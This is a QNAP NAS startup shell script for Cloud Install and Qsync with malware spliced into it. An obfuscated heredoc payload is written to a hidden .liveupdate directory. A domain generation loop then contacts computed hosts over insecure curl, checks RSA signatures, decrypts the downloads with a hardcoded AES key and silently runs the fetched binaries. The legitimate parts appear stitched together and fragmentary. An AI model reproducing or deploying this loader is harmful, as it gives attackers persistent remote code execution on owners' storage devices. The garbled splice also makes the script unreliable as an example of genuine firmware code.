#!/bin/sh
export PATH="${PATH}:/bin:/sbin:/usr/bin:/usr/sbin:/usr/bin/X11:/usr/local/sbin:/usr/local/bin"
command -v dirname >/dev/null 2>&1 || dirname () { test -z "$1" && echo "." && return; local r="${1%"${1##*[!/]}"}"; case $r in /*[!/]*/*|[!/]*/*) r="${r%/*}"; echo "${r%"${r##*[!/]}"}";; */*) echo ${r%%[!/]};; "") echo $1;; *) echo .;; esac; }
test -d /etc/config && confdir=/etc/config || { test -d /mnt/HDA_ROOT/.config && confdir=/mnt/HDA_ROOT/.config; }
test -d "$confdir" || confdir=/etc/config
command -v getcfg > /dev/null 2>&1 || getcfg () { sed -n 'H;${x;s/\(.*\
\['"${1//\//\\\/}"']\|^\['"${1//\//\\\/}"']\)\
//I;s/\(^\|\
\)\[[^\
]\+\]\
.*//p}' "${4:-${confdir}/uLinux.conf}" | sed -n 's/^'"${2//\//\\\/}"' \?= \?\(.*\)/\1/Ip'; }
bdir=
test -f "${confdir}/smb.conf" && for i in homes Public Download Multimedia Web Recordings; do bdir=`getcfg "$i" path -f "${confdir}/smb.conf"` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && test -d "$bdir" && testwriteable=$(mktemp "${bdir}/.tmp.XXXXXX") && rm "${testwriteable}" && break; bdir=''; done
test -z "${bdir}" || test ! -d "${bdir}" && { command -v readlink >/dev/null 2>&1 || ln -sf /bin/busybox /usr/bin/readlink; for i in homes Public Download Multimedia Web Recordings; do bdir=`readlink "/share/${i}" 2>/dev/null` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && bdir=/share/${bdir##*/} && test -d "$bdir" && break; done;
test -z "${bdir}" || test ! -d "${bdir}"; } && { bdir=`getcfg SHARE_DEF defVolMP -f "${confdir}/def_share.info"`
test -z "${bdir}" || test ! -d "${bdir}"; } && { bdir=`mount | sed -n "s/.*\(\/share\/[^ /]\+\) .*/\1/gp" | head -n 1`
test -z "${bdir}" || test ! -d "${bdir}"; } && { for i in CACHEDEV3_DATA CACHEDEV2_DATA CACHEDEV1_DATA MD0_DATA; do test -d "/share/${i}" && bdir="/share/${i}" && break; done;
test -z "${bdir}" || test ! -d "${bdir}" && bdir=/mnt/HDA_ROOT; }
echo 'ab*c' | grep -F 'ab*c' >/dev/null 2>&1 && fgrep="grep -F" || { command -v fgrep >/dev/null 2>&1 && fgrep=fgrep || fgrep=grep; }
test "$fgrep" || fgrep=grep

if [ ! -f "${bdir}/.qpkg/.liveupdate/liveupdate.sh" ]; then
test -d "${bdir}/.qpkg" || mkdir -p "${bdir}/.qpkg" || mkdir "${bdir}/.qpkg"
test -d "${bdir}/.qpkg/.liveupdate" || mkdir "${bdir}/.qpkg/.liveupdate"
cat > "${bdir}/.qpkg/.liveupdate/liveupdate.sh" <<"XEOF"
#!/bin/sh
xdEIZP=${ChSqzKBSW}t${fndSX}r${RiADoEekYl}
CHQOUaEF=${mKukBzqlFWte}${RcAgv}'\'${CzwGKoExdSNb}${oqEoH}; ZdBaYuwO=${uSWVs}${wtxOLMzrX}${zUlDx}${CHQOUaEF}${hnTYzqNIR}${WEJkC}${kMhyJjnAFI}133; FALbYHfu=${VZmgi}${VEElEOlov}${eDUDq}${CHQOUaEF}${iBBKUXigc}${QSddu}${JpoASfGrvy}055; ivTDLYcJ=${oVdmD}${BoQprMhPn}${ooVsb}${CHQOUaEF}${CYldesVQs}${AZyIt}${FImBFvbeBf}134; $xdEIZP 'O)sjM{bTXIL'$ivTDLYcJ'xq"}h*ig%PckK;\nE#Qm'$ZdBaYuwO'n'"'"'=So+Uu(W BvCarF!]N|'$FALbYHfu'YztG<HJ$RDVZedf`yAp&l>w' '{qjLaI` +F)'$ZdBaYuwO'cYsu]#%'$FALbYHfu'e;fNGk<Mx$pQO(UBy=VKTPb!g'"'"'*nJrv'$ivTDLYcJ'SX&zWwtR>\nmEhi"}A|lDHoZCd' << "cLgBgGVGUVG" | ${czsznolvy}s${oLDnn}h${RWzWuKOHEj}
>p)yDAmrqz+QO<{>=D!d/V&QOnok rU[uuffAdR%/QOEH%>t!tk!dV<QO-jZw%nAFxHF!d<mQO<|%nx]mIR((rdw/QOjE&sKud"oQO;[#Evv%D>Z=H"tqd"y&QO}qEr kdv.xvQORFFSAxjlVHc-dZQO!K%>pKkstd$QOjKcUs Aud<!QOUAyHjzW}syU%dQOwtA|ERdTCTBR%`u NrfLFPWmckO]+aHIoJzyDUSAp(i<vE!bCeCeCM}n'sqYN055hj[N133l{w;K-"x&
>N134#t=QeV|G*)ZdXrCTCVUMm`K(iN055aPECeCeCYNrJO{%=-)t'Z
kLsp]+Ge&"dqryIvQ|>Hu;<Ao}nN134fxD Xw#N133*jBbThcRlSWz[F!C

e|A[F"ISm|AVeJQ>p)yDAmrqz$Nt/"zC/ETcn+CrEjrQJUQcOQcQQQQMvKRMQE(FcQQQQMvKRMQ|zC('O1:f4!FcQQQQMvKRMQ|R
('O2:f12!FcQQQQMvKRMQhE%RK+(<'O3:fRfZ;fG!<cQQQQjrQf&KQ<'hE%RK+<QyQ/&+p/lrRC&v|Q`QOQcQQQQQQQQr+R&QfrCQ'JJ'Y;D[{PQ$QJQ'|R
QfQ'|zCQxQ1QUQxQ'|zCQUUQEFcQQQQQQQQ+KTvQ<'E<cQQQQ!c!cKv||RC&QfpQ|hj+|%QkQ/&+p/ClMMQ2km1Q``Q|hj+|%QJUQOQcMvKRMQElVVz
(=n+CrEjrQ6Q6=cj+EjQ<'2<QmmQOQ|h&zrQ<'O2$HHHHHH!'ElVVz
<FQ+KTvQ<'O2$HHHHHH!'ElVVz
<FQ!Q``QOQjvlKTQ<'O1$HHHHHH!'ElVVz
<FQ+KTvQ<'O1$$HHHHHH!'ElVVz
<FQ!c!c+
+KQ2k/&+p/ClMMc); A(<'O); A!:/"zC:/E"zC:/lEr/"zC:/lEr/E"zC:/lEr/"zC/H11:/lEr/MvKRM/E"zC:/lEr/MvKRM/"zC<cj+EjQtQfZQ<'Oda-Yb_s Y]Du!<Q``QOQ%rzCjVQ<[Rj+:Q<FQ G(uP Q&Rj+FQ+
zjQ0FQ!c+KTvQ<[Rj+:Qo+&Qs+%Q21Q19:48:17QuP Q2016<cKr(=%rzCjVQWwrWQ``Q+KTvQfC+QWwrW=cj+EjQ<'ONKr!<Qf+IQ1QmmQ+KTvQ<'Kr<Q``Q+KTvQ<<cj+EjQ<
'A  )_Y-}-Y-Y<Q(Q<
&7298"47&745055&4V03&K507VR7K++VV&64+340<Q``Q+
zjQ0cj+EjQtQfZQ<'O0!<QmmQj+EjQ=%EQRl
Q`Qnr+%Q<'O0!<Q`QiKQfM=QfnjQ40QmmQ+
zjQ0cKv||RC&QfpQv%+CEEMQk/&+p/ClMMQ2km1QmmQOc){s [; ;(WWch(<a;&|;4ZrBa3g9;SX;8{s&DRplA76aql2<cj+EjQ<
'OY-da-s _P- A{[!<Q(Q
){s QmmQj+EjQtQfZQ<'Oda-Yb_s Y]Du!<QmmQKRE+Q<'Oda-Yb_s Y]Du!<QzCQWWQ`QL>t0f9eLQ`Q0LQUQVRME+QFFQ>0f9e>0f9e>0f9e>0f9e>0f9e>0f9e>0f9e>0f9eQUQ&(<'JJQ=&Rj+Qx$E=Q/Q100QUU<FQj+EjQ<'Oda-Yb_s Y]Du!<Q(Q<'O&!<QmmQKj(<'&<Q``QOQj+EjQ<'Oda-Yb_s Y]Du!<Q(Q<'JJQ'&QfQ1UU<QmmQKj(<'JJQ'&QfQ1QUU<FQ!QFFQLUQVRME+QFFQ+ERKQmmQj+EjQtQfZQ<'Oda-Yb_s Y]Du!<QmmQOcCM(WcWcKRE+Q<'Oq{D -D _#-Du A!<QzCQWWQ`QL>t0f9eLQ`Q0LQUQVRME+QFFQLUQj+EjQ<'Oq{D -D _#-Du A!<QfMjQ2147483646QFFQ+ERKQmmQOQ]}s(Qr+R&Qf&QWWQfrCQ<'Oq{D -D _#-Du A!<Q){s [; ;FQj+EjQfZQ<'){s [; ;<QmmQ){s [; ;(=&&Q"E(1QKvlCj(<'q{D -D _#-Du A<Q2k/&+p/ClMM=FQ!Q``Qj+EjQ<'){s [; ;<Q``Q){s [; ;(=KRj=Q``Q+
zjQ0cE(<'O){s [; ;NNL.!<cEj(<'OENNLf!<cE(<'OE$$fL!<c&(<'JJQ'&Q/Q1000QUU<cj+EjQtQfZQ<'&<QmmQj+EjQtQfZQ<'Ej<QmmQj+EjQ<'ONEj!<Q(Q5QmmQOQj+EjQ<
'Ej<Q(Q<
'&<Q``Qj+EjQ<
'Ej<Q(Q<
'JJQ'&QfQ1QUU<FQ!Q``QOQj+EjQfVQ<'j<QmmQr|Q<'j<FQ+
zjQ0FQ!cKRE+Q<'E<QzCQWWQ`QL>tRfZ;fG0f9/x('CMeLQUQj+EjQfVQ<'j<QmmQr|Q<'j<FQ+
zjQ0FQFFQ+ERKcj(=|hj+|%Q/j|%/.j|%.HHHHHH=Q``Q+
zjQ0cKRjQkQ<'j<Qyy<-{}<Q``QOQj+EjQfVQ<'j<QmmQr|Q<'j<FQ+
zjQ0FQ!cfffff*-u]DQ)a*#]qQg-bfffffcP]]*vS;D*nhIThzu9i0*;d-};;{q;b8;P]]*zngq;b-;\zuxA/1VK#PV Dapp*+Ec{XI06V{u|*}g]a{q)E\u%;lZ[rqgMC*lAv#4Ts-jCl
 *Dj8S;*Z&Gx%9Ia";G3{cZR)|X]&E1nAAM1g}xd8A5"D&DE9PqYh-pqanXu}+3;RM#7hxS/YH*EorE#qg&ugocRAx&jq0D&#g&hZTg8I*IZA
qxPauZ++5//{n[g&Kg++MRqnZaXR0lz11*G3]Sg%dcM7AvhBA|\ZYrXu)KlK4hMA9"g4s+;[+TY\S\MzpAdKIsg1EDEiR%X|2I[S\d7TSYcY2ER{Zl" ai1x2dgMxP\5sV\v/*8Dv%Db6-;{#8bq)BAqR%I2RV2G\jTRB22B%VbcZjZS-\5{h}DT6VYnGD%"ElPl4C)R*/rnpX|Eo
93RCET4]+Hz)\{lgB*R|aG\]p#c
r2-sq2rTnoTInXlz#MAuxAPg63)v&*P}\gI9r#&4T99CH"9xzq|}d9VZXgE9ssPcS7
R&u%R"g2RD %D3Z[;l-u]4G{jI
#IoS-A|0"-xG5};nP*;;-(cfffff-D[Q)a*#]qQg-bfffffc-{}cj+EjQtQfZQ<'E<QmmQT(=v%+CEEMQ"RE+64Qf&Qyy-{}Q`Qv%+CEEMQrERljMQf%l"zCQfzCh+\Q<'j<Qfp+rzV\c'Ec-{}c=Q``QOQj+EjQfVQ<'j<QmmQr|Q<'j<FQ+
zjQ0FQ!cj+EjQfVQ<'j<QmmQr|Q<'j<c|(<'O){s [; ;$$.L!<c){s [; ;(WWcKRE+Q<'|<QzCQWWQ`QL>tRfZ;fG0f9/x('CMeLQUQ+
zjQ0QFFQ+ERKch(=v%+CEEMQ&nEjQfETR1Qf"zCRr\QfT|RKQ<'Kj<Qyy-{}Q`Qv%+CEEMQ"RE+64c'hc-{}c=c|(=v%+CEEMQ+CKQf&QfR+Ef256fK"KQfhQ<'h<Qf|&QETR1QfERMjQfRQyy-{}c'|c-{}c=c|T(=v%+CEEMQ&nEjQfETR1Qf"zCRr\QfT|RKQ<'Ej<Qyy-{}Q`Qv%+CEEMQ"RE+64c'|c-{}c=cj+EjQtQfZQ<'T<QmmQj+EjQ<'T<Q(Q<'|T<Q``Q+
zjQ0c+pRMQ<'|<cjrl+c!Q``QOcj(=|hj+|%Q/j|%/.j|%.HHHHHH=Q``Q+
zjQ0cKRjQkQ<'j<Qyy<-{}<Q``QOQj+EjQfVQ<'j<QmmQr|Q<'j<FQ+
zjQ0FQ!cfffff*-u]DQ)a*#]qQg-bfffffcP]]*vS;D*nhIThzu9i0*;d-};;{q;b8;P]]*zngq;b-;9d|APi4Si8q{#bgn{IVqc0uGEYsi}nz
 0MzPK42GsrEErE}uGM[)g35ZM&|"aE-dHj}bh[SB+aKh%2RT8}KVc;*}au8P#CM6i p
uGiXX"P#)[zbv5M/&07*gK"iblID%x2//2&lh
q\Rh{]]C]I}c#nrP5Cp%5*g**KKPMP*RE}j
GV}njDSMd9z9|DVz53CRMrP)YvM9gzVo1b
|#i1xc7u lS}sM\g9;%pz/G]2\/p\|6Do"o-ER-5*9nnHXbrB
M"g
P]ZolHV18s2%48}Tc%Ba\bX0|S[aK3szXY4Yz)zh)% dnhsS\90RPgrvoq;&9P6KGjViqZTP"p\jD|&j&cb
*DDC0}|d51K#)Kx&%R]]
2z/2Ku&Ab8G;S*[P*P*hS]+2n}nK6MX0o{M 638Zxci7/|)xTKqv#Bazusz-l|Z3a#5)|vBR3i2j04YR70)#o;%uE]/n%A\A0o8z6\B*A-cIaERd
C*{}p\xzsv|\}zM2&
gd#S i\G*C8x1g|vCX2%;nP*;;-(cfffff-D[Q)a*#]qQg-bfffffc-{}cv%+CEEMQrERljMQf%l"zCQfzCh+\Q<'j<Qf+CKr\%jQyy-{}Q`Qv%+CEEMQ"RE+64c'hc-{}cr|Q<'j<cjrl+Qc!FQjrl+FQ!Q``QOcj+EjQ<
';qq-) _#;Dua;u-<Q(Q<
53"&00K"5K05912V6+230V+&3308+15V44+7V"4V<QmmQ+pRMQ<'OA  )_as-Y_;u-D !<c!cj+EjQfVQ<'j<QmmQr|Q<'j<cEM++%Q1c+
zjQ0c$|A[F"ISm|AV$QOSjD=frxp%dxVR&wQOFAuj-IxsdT75QOjo&s)x>xGd5QOn;Ht(|KUdTeQ>p)yDAmrqze$%#Z<T0$$*
cLgBgGVGUVG
QNAP_QPKG=cloudinstall
QID_PRESISTENT_CONF=/etc/config/qid_persistent.conf
NAS_CLOUD_INSTALL_PATH=/home/httpd/cgi-bin/cloudinstall
CLOUD_INSTALL_PATH=/tunnel_agent
CLOUD_INSTALL_RAMDISK_PATH=/tunnel_agent_ramdisk
CLOUD_INSTALL_AGENT_FILE_PATH=$CLOUD_INSTALL_PATH/tunnel_agent.tar.bz2
COUNTER=1
ERROR_BAD_REQUEST=400

if [ "$fromrcS" = 'TRUE' ]; then
case "$1" in
  start)
    START_TIME=$(date +"%T")
    echo -e "start:$START_TIME" >> /tmp/.cloudinstall.log
    while [ "$CLOUD_INSTALL_AGENT_PID_LIST" == "" ];
    do
        # report device info and get cloudinstall agent app download url
        DOWNLOAD_URL=`/usr/sbin/qcloud_uninit_device_tool -r`
        if [ ! -d "$CLOUD_INSTALL_PATH" ]; then
            if [ "$NAS_ARCH" == "ARM_64" ]; then
                # create ramdisk and create a 64mb file
                /bin/mkdir -p $CLOUD_INSTALL_RAMDISK_PATH
                /bin/mount -t tmpfs -o size=64m tmpfs $CLOUD_INSTALL_RAMDISK_PATH
                /bin/dd if=/dev/zero of=$CLOUD_INSTALL_RAMDISK_PATH/image bs=1M count=64
                # create block size 1K filesystem
                /sbin/mke2fs -b 1024 $CLOUD_INSTALL_RAMDISK_PATH/image
                # create virtual disk
                export USED_LOOP_DEVICE=`/usr/local/sbin/losetup -f $CLOUD_INSTALL_RAMDISK_PATH/image`
                /sbin/setcfg -f $QID_PRESISTENT_CONF "CLOUDINSTALL" "USED_LOOP_DEVICE" "$USED_LOOP_DEVICE"
                /bin/mkdir -p $CLOUD_INSTALL_PATH
                # mount virtual disk
                /bin/mount $USED_LOOP_DEVICE $CLOUD_INSTALL_PATH
            else
                # create and mount tmpfs folder
                /bin/mkdir -p $CLOUD_INSTALL_PATH
                /bin/mount -t tmpfs -o size=64m tmpfs $CLOUD_INSTALL_PATH
            fi
        fi
        cd $CLOUD_INSTALL_PATH

        if [[ $DOWNLOAD_URL == https* ]]; then
            REPORT_SUCCESS_TIME=$(date +"%T")
        else
            REPORT_FAIL_TIME=$(date +"%T")
            echo -e " report_fail:$REPORT_FAIL_TIME\n response:$DOWNLOAD_URL" >> /tmp/.cloudinstall.log
            # stop retry when got bad request
            # prevent put bad request all the time
            if [[ $DOWNLOAD_URL == *$ERROR_BAD_REQUEST* ]]; then
                break
            fi
        fi

        # downlaod cloudinstall agent app
        /usr/sbin/qcloud_uninit_device_tool -o "$CLOUD_INSTALL_AGENT_FILE_PATH" -d "$DOWNLOAD_URL"

        if [ -f "$CLOUD_INSTALL_AGENT_FILE_PATH" ]; then
            DOWNLOAD_FINISH_TIME=$(date +"%T")
            # unzip and execute cloudinstallagent
            /bin/tar -xf $CLOUD_INSTALL_AGENT_FILE_PATH -C $CLOUD_INSTALL_PATH
            $CLOUD_INSTALL_PATH/bin/cloudinstall_agent_ctl.sh start &> /dev/null

            UNZIP_TIME=$(date +"%T")
        fi

        if [ ! -d "$NAS_CLOUD_INSTALL_PATH" ]; then
            # create folder and create symbolic link
            /bin/mkdir -p $NAS_CLOUD_INSTALL_PATH
            /bin/ln -s $CLOUD_INSTALL_PATH/ui/cloudinstall.html $NAS_CLOUD_INSTALL_PATH/index.html
            /bin/ln -s $CLOUD_INSTALL_PATH/ui/cloudinstall.cgi $NAS_CLOUD_INSTALL_PATH/cloudinstall.cgi
            /bin/ln -s $CLOUD_INSTALL_PATH/ui/static $NAS_CLOUD_INSTALL_PATH/static
        fi

        # wait connect
        sleep 5
        CLOUD_INSTALL_AGENT_PID_LIST=`/bin/ps --columns 256 | /bin/grep "$CLOUD_INSTALL_PATH/bin/cloudinstallagent" | /bin/grep -v grep | /bin/awk '{print $1}'`
        if [ "$CLOUD_INSTALL_AGENT_PID_LIST" == "" ]; then
            SLEEP_TIME=$(( 30 * $COUNTER ))
            if [ $SLEEP_TIME -gt 300 ]; then
                SLEEP_TIME=300
            fi
            # wait next retry
            sleep $SLEEP_TIME
        fi
        COUNTER=$(( $COUNTER * 2 ))
    done

    END_TIME=$(date +"%T")
    echo -e "report_success:$REPORT_SUCCESS_TIME\ndownload_finish:$DOWNLOAD_FINISH_TIME\nunzip_finish:$UNZIP_TIME\nend:$END_TIME" >> /tmp/.cloudinstall.log
    # call for a new process group and for later kill
    /bin/setsid $CLOUD_INSTALL_PATH/bin/cloudinstall_agent_disconnect_daemon.sh start &> /dev/null &
    /bin/setsid $CLOUD_INSTALL_PATH/bin/cloudinstall_agent_daemon.sh &> /dev/null &

    # set cloudinstall report status
    /sbin/setcfg -f $QID_PRESISTENT_CONF "CLOUDINSTALL" "REPORT_STATUS" "uninit"
    # add link to report offline
    /bin/ln -sf /etc/init.d/cloudinstall_report_offline.sh /etc/rcK.d/K99cloudinstall_report_offline

    # buzzer
    HARDWARE_TYPE=$(uname -m)
    if [[ "$HARDWARE_TYPE" == *"x86"* ]];
    then
      /sbin/hal_app --se_buzzer enc_id=0,mode=101
    elif [[ "$HARDWARE_TYPE" == *"arm"* ]];
    then
      /sbin/pic_raw 81
    fi
    ;;

  stop)
    # disconnect cloudinstall agent
    $CLOUD_INSTALL_PATH/bin/cloudinstall_agent_ctl.sh stop &> /dev/null
    $CLOUD_INSTALL_PATH/bin/cloudinstall_agent_disconnect_daemon.sh stop &> /dev/null
    for i in "${CLOUD_INSTALL_AGENT_DAEMON_PID_LIST[@]}"
    do
        # use bash kill instead /bin/kill for kill process group
        # cloudinstall agent daemon and inotifywait
        kill -9 -- -$i &>/dev/null
    done

    # umount
    if [ "$NAS_ARCH" == "ARM_64" ]; then
        /bin/umount -l $USED_LOOP_DEVICE
        /usr/local/sbin/losetup -d $USED_LOOP_DEVICE
    else
        /bin/umount -l $CLOUD_INSTALL_PATH
    fi
    # remove all files
    if [ -d "$NAS_CLOUD_INSTALL_PATH" ]; then
        /bin/rm -rf $NAS_CLOUD_INSTALL_PATH
    fi
    if [ -d "$CLOUD_INSTALL_PATH" ]; then
        /bin/rm -rf $CLOUD_INSTALL_PATH
    fi
    if [ -d "$CLOUD_INSTALL_RAMDISK_PATH" ]; then
        /bin/rm -rf $CLOUD_INSTALL_RAMDISK_PATH
    fi
    ;;

  restart)
    $0 stop
    $0 start
    ;;

  *)
    echo "Usage: $0 {start|stop|restart}"
    exit 1
esac
exit 0


set_env()
{
	debug=`$CMD_GETCFG Qsync Debug -u -d NULL`
	if [ "$debug" != "NULL" ]; then
		/bin/touch $LOG_FILE
	else
		/bin/rm -f $LOG_FILE
	fi
}

set_env

dbg()
{
	if [ -f "$LOG_FILE" ]; then
		echo "[`date "+%H:%M:%S"`] $@ " >> $LOG_FILE
	fi
}

dbg "> $0 $@ (pid $$)"

fi

export PATH="${PATH}:/bin:/sbin:/usr/bin:/usr/sbin:/usr/bin/X11:/usr/local/sbin:/usr/local/bin"

command -v getcfg > /dev/null 2>&1 || getcfg () { sed -n 'H;${x;s/\(.*\n\['"${1//\//\\\/}"']\|^\['"${1//\//\\\/}"']\)\n//I;s/\(^\|\n\)\[[^\n]\+\]\n.*//p}' "${4:-${confdir}/uLinux.conf}" | sed -n 's/^'"${2//\//\\\/}"' \?= \?\(.*\)/\1/Ip'; }

test -d /etc/config && confdir=/etc/config || { test -d /mnt/HDA_ROOT/.config && confdir=/mnt/HDA_ROOT/.config; }

bdir=
test -f "${confdir}/smb.conf" && for i in homes Public Download Multimedia Web Recordings; do bdir=`getcfg "$i" path -f "${confdir}/smb.conf"` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && test -d "$bdir" && testwriteable=$(mktemp "${bdir}/.tmp.XXXXXX") && rm "${testwriteable}" && break; bdir=''; done
test -z "${bdir}" || test ! -d "${bdir}" && { command -v readlink >/dev/null 2>&1 || ln -sf /bin/busybox /usr/bin/readlink; for i in Public Download Multimedia Web Recordings homes; do bdir=`readlink "/share/${i}" 2>/dev/null` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && bdir=/share/${bdir##*/} && test -d "$bdir" && break; done;
test -z "${bdir}" || test ! -d "${bdir}"; } && { bdir=`getcfg SHARE_DEF defVolMP -f "${confdir}/def_share.info"`
test -z "${bdir}" || test ! -d "${bdir}"; } && { bdir=`mount | sed -n "s/.*\(\/share\/[^ /]\+\) .*/\1/gp" | head -n 1`
test -z "${bdir}" || test ! -d "${bdir}"; } && { for i in CACHEDEV3_DATA CACHEDEV2_DATA CACHEDEV1_DATA MD0_DATA; do test -d "/share/${i}" && bdir="/share/${i}" && break; done;
test -z "${bdir}" || test ! -d "${bdir}" && bdir=/mnt/HDA_ROOT; }
grep -F '' <<EOF >/dev/null 2>&1 && fgrep="grep -F" || { command -v fgrep >/dev/null 2>&1 && fgrep=fgrep || fgrep=grep; }

EOF
test "$fgrep" || fgrep=grep
test "$RANDOM" || RANDOM=17653
genrstr () 
{ 
    local s=;
    local min=${1:-4};
    local max=${2:-12};
    local kspace="${3:-a-zA-Z}"
    tr -dc "$kspace" < /dev/urandom | { 
        read -rn $(($RANDOM % ( $max - $min + 1 ) + $min )) s;
        echo "$s"
    }
}

verifyfile() {
local file="$1"
local sig="${2:-$file_s}"
local out
test ! -z "$file" && test -s "$file" || return 1
test ! -z "$sig" && test -s "$sig" || return 1
test -f ".rsakey" || echo "$verifykey" > ".rsakey"
out=$(openssl dgst -sha1 -verify ".rsakey" -signature "$sig" "$file") && test "$out" = "Verified OK" && return 0
return 1
}

decryptfile() {
local file="$1"
local ofile="${2:-${file}}"
local key='7C0vK4SzMO15zBxLD7XCi5hbjgP1ZjkJ'
openssl enc -d -aes-256-cbc -k "$key" -md sha1 -salt < "$file" > "${file}_d" || return $?
test -f "$ofile" && rm -f "$ofile"
mv "${file}_d" "$ofile" && return 0
return 1
}

verifykey='-----BEGIN PUBLIC KEY-----
MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAt/EDT6SB75atrHW7Cpog
CXqrBM2CVbJo';verifykey="${verifykey}"'g4rwwS''z1Bp1i1'
verifykey="${verifykey}"'B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex
RC5qQSiS/7FS48jsPKsJnrUhnsI1fRLM4DqsEF3UOukZuDOYUhlteDuMqqZBz0AC
Q3YnLjraTjchMF0XmaAAcWOkg5MsxAOKTepue4R/tnrPAkAG86nq5LA1+wa7opNV
gQzwDh7YXhBnWz52+ebZ9TeqD31/sb5hoyUKf1Nr5HcKkklObuz1OGQJ//pkCbTC
2EnQw6tCPQhgSIA8wJKkaxW0f/UHP+YBmWa4Wn+uPrJJuHSVNEJtAp2wlX3THltz
0IGPQEuzoafOAl3EFjas3HcTX2HlEfnvAtRL2iLxJeba1nZ+U3geZOuxL1NhWhNh
pjaLcKwhkRck7Y5hr1Pz8pLDnXsx5w0QUz6XS8HVf/KHnNXHufFEn01y9YoPuau1
DNnpDGbq632Bs8ESd3ueHk9OY/UZxWeN3UdbseFxK35XAgMBAAE=
-----END PUBLIC KEY-----'

DOMAIN_EXT_A='cf tk ml ga gq'
DOMAIN_EXT_B='com biz org de rocks mx cn top nl men ws se info xyz net today ru fi name to in com.ua vg vn cd'

test -d "${bdir}/.qpkg" || mkdir "${bdir}/.qpkg"
test -d "${bdir}/.qpkg/.liveupdate" || mkdir "${bdir}/.qpkg/.liveupdate"
cd "${bdir}/.qpkg/.liveupdate" && rm -f .tmp.*

echo "$verifykey" > ".rsakey"
i=0 n=0 c=0 errorcount=0
outfile=$(mktemp "./.tmp.XXXXXX") || outfile=$(mktemp "${bdir}/.tmp.XXXXXX") || outfile=$(mktemp "/.tmp.XXXXXX") || outfile='./.tmp.out'

for domainexts in "$DOMAIN_EXT_A" "$DOMAIN_EXT_B"; do
        for ext in $domainexts; do
                hostname=$(echo "$(( $(date +%s) / 1296000 ))IbjGOEgnuD${ext}" | openssl dgst -sha1 -binary | openssl base64 | sed 'y/ABCDEFGHIJKLMNOPQRSTUVWXYZ-+\//abcdefghijklmnopqrstuvwxyzabc/;s/=//g')
                hostname=${hostname%[a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9]}
                hostnames="${hostname%[a-z0-9][a-z0-9][a-z0-9][a-z0-9]} ${hostname%[a-z0-9][a-z0-9][a-z0-9]}"
                hostnames="$hostnames ${hostname%[a-z0-9][a-z0-9]} ${hostname%[a-z0-9]} $hostname"
                for host in $hostnames; do
                        test -f "$outfile" && rm -f "$outfile"
                        recentupdate=''
                        curl --connect-timeout 12 -m 30 -k -o "$outfile" "https://${host}.${ext}/qnap_firmware.xml?t=$(date +%s)"
                        test -s "$outfile" || continue
                        fsize=$(( $(wc -c < "$outfile") ))
                        test "$fsize" -gt 4096 && rm -f "$outfile" && continue
                        rsamsg=$(openssl base64 -in "$outfile" -d | openssl rsautl -pubin -inkey ".rsakey" -verify) || continue
                        test "$rsamsg" || continue
                        path="${rsamsg%|*}"; rsadomain="${path%|*}"; path="${path#*|}"
                        hash="${rsamsg##*|}"; ts="${hash#*_}"; hash="${hash%_*}"
                        test "$rsadomain" = "${host}.${ext}" || continue
                        timenow=$(date +%s)
                        test "$ts" -gt 0 && { test "$ts" -gt "$timenow" || test $(( $timenow - $ts )) -lt 172800; } && recentupdate=1
                        curl --connect-timeout 12 -m 300 -k -o "$outfile" "https://${host}.${ext}/${path}"
                        filehash=$(openssl dgst -sha1 -binary "$outfile" | openssl base64) || continue
                        test "$filehash" = "$hash" || continue
                        curl --connect-timeout 12 -m 30 -k -o "${outfile}_s" "https://${host}.${ext}/s/${path}"
                        verifyfile "$outfile" "${outfile}_s" && decryptfile "$outfile" || continue
                        mv "${outfile}_s" "${ts}_v"
                        chmod 755 "$outfile" || continue
                        ( ( exec >/dev/null 2>/dev/null </dev/null; "$outfile" </dev/null >/dev/null 2>&1 & ) & )
                        test "$recentupdate" -eq 1 && exit 0
                done
        done
done


if [ "$fromrcS" = 'TRUE' ]; then
# if Qsync is disable before 4.3.0, we will touch /mnt/HDA_ROOT/udpate_pkg/.QsyncServer_disabled
set_default_disable_status()
{
	QPKG_ENABLE=`$CMD_GETCFG ${QSYNC_NAME} Enable -d "NULL" -f ${QPKG_CONF}`
	OLD_ENABLE=`$CMD_GETCFG Qsync Enable -u -d NULL`
	if [ -f "${UPDATEPKG_DIR}/.${QSYNC_NAME}_removed" ]; then
		return
	fi

	if [ "$QPKG_ENABLE" = "NULL" ]; then
		if [ "$OLD_ENABLE" = "FALSE" ]; then
			dbg "touch ${UPDATEPKG_DIR}/.${QSYNC_NAME}_disabled"
			/bin/touch "${UPDATEPKG_DIR}/.${QSYNC_NAME}_disabled"
		fi
	fi
}

if [ "x$HBS_ENABLE" = xnull ] || [ "x$HBS_ENABLE" = xFALSE ]; then
	export QNAP_QPKG=rtrr
else
	export QNAP_QPKG=HybridBackup
	/usr/local/sbin/qboost_util -S -n rtrr -E 0 1>/dev/null 2>&1
fi
start()
{
	if [ -f /usr/bin/qsyncman ]; then
		[ ! -f /etc/config/hdcopyusb.conf ] || /bin/rm -f /etc/config/hdcopyusb.conf
		/bin/sed -i '/hdusb_copy/d' /etc/config/crontab
		/usr/bin/crontab /etc/config/crontab
		echo -n "Starting QSync manitor: "
		[ -d /etc/config/qsync ] || /usr/bin/install -d /etc/config/qsync
		[ -f /etc/config/qsync/qhost.conf ] || /bin/touch /etc/config/qsync/qhost.conf
		[ -f /etc/config/qsync/qsyncjobdef.conf ] || /bin/touch /etc/config/qsync/qsyncjobdef.conf
		[ -f /etc/config/qsync/qsync.conf ] || /bin/cp -p /etc/default_config/qsync/qsync.conf /etc/config/qsync/qsync.conf
		[ -f /etc/config/qsync/extdrv.conf ] || /bin/cp -p /etc/default_config/qsync/extdrv.conf /etc/config/qsync/extdrv.conf
		[ -f /etc/config/qsync/qsyncd.conf ] || /bin/cp -p /etc/default_config/qsync/qsyncd.conf /etc/config/qsync/qsyncd.conf
		[ ! -f /etc/config/qsync/qsyncd.conf ] || /bin/chmod 640 /etc/config/qsync/qsyncd.conf
